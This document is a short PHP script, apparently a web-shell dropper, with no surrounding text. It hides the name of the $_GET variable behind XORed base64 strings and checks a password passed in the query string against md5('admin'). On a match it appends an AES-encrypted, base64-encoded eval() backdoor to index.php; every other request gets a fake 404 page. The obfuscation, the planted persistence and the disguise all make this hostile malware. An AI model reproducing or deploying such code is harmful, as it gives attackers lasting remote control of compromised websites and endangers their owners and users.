
<?php
$a = ${base64_decode("ZC0+KQ==")^base64_decode("O2p7fQ==")}[1];
$ar = base64_decode("aW5kZXgucGhw");
$arr = explode('|',$ar);
foreach($arr as $k => $inject_php){
//  1 is md5('admin'). You can have on your own.
if(md5($a)=='21232f297a57a5a743894a0e4a801fc3')
{
	file_put_contents($inject_php, "<?php eval(base64_decode(openssl_decrypt('PbFgmp3SQoVkSTAuPzDI0tEobTt11LR8wpU7u836TqHXFUEV5JMZPyQyvM4Gy8Ivyq0/Bevejyvaj+E94lbUHfJ9unfxdeTUSR+oszHCc9w6JN8KAAm6LRrrEBg7sdfMmtbthL/VpfWMEQXu2c3DC/fR4nLiLSN9AD8nx2l8gpoLtqcF+dbW0paD3Uwx9aFgmgWH94xaTrA6wlRxe7iLGSw0oEYZ/Awas2YPHtOmczRCtYRv4gXvv7MEmL7S4cYVtYY0KpgepSmi1RHB+niK/2M8xS/oM8EHu9vnOzniWNydXVfLFyKLaAtMz2sL6vCBZCX0HtIclQNo8J9OlKskILYwVNVSvWERQVxnGBbniKKagtaqhJL8Xix83oGmr8IpCfHASDxYMhI3PGviVBFr40welrmE1yceygCmwGr8Z5LoqxisKfxMJimjuJDHROK/j4Fciln0vyqK4A5pVFQpctrGpLqtlnbSuUAH2j7VGYowCOjGCijGi7DisZt+M1pAoithDRpOztVObyEllJm90Up2/mGN+lWBKiQK/k+4Ynb3OeiwEn9SeJ7m/z2N+eQarcNFBm3QV15nrotjE7jfO+X9n+CZz1l3ae5wOvTSwIxf6oT4fK6Ps6eDnxt79x4JV6r15QsM8fmc1BPjIS0gNl+nAvzqtpC1sqjcV92sTdNPj9FGQf1U+eJe6WxSM5plyv3kSzdOsl6V4j7ls2gvaYfeI8MBqhHoFmz+oKZLJFBgwdAcPCrVr4vhen7jSTS2TtQ2tDOGaAeHfvBVFSYlRgGt6+/pqsz9dBPQEQVRVzbFnZdjXF9tmp19Ivr/uc8nr040Z9nkAoXNRmRkgH13qAmZBJlQvdASaWCNALEf9tR/SwZSrNwHomRbBHgNJmdO++dgD7ry2YJ0ZQnbFzafDLrtvnmtvzWLEnELKMXwKnnQKnKoe1T+0/jBdhnadj4gW6WIqa5mSzz9TVeoBbRLMZEm/Y9rhyilX+4u607g2AI=', 'AES-128-ECB','21232f297a57a5a7')));?>",FILE_APPEND);
}
else{
	
	echo '<title>Error 404!!1</title><p>404.Not Found</p>';

	header('HTTP/1.1 404 Not Found');
	http_response_code(404);
}
}
?>

